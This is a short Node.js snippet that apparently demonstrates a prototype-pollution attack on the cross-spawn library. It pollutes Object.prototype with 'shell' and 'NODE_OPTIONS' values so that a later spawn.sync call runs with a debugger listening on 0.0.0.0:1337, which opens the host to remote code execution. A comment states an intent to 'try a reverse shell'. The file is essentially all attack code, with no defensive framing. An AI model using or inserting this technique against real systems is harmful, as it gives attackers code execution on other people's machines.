const spawn = require('cross-spawn');

Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

// TODO: try a reverse shell
 
const result = spawn.sync('npm', ['list', '-g', '-depth', '0'], { stdio: 'inherit' });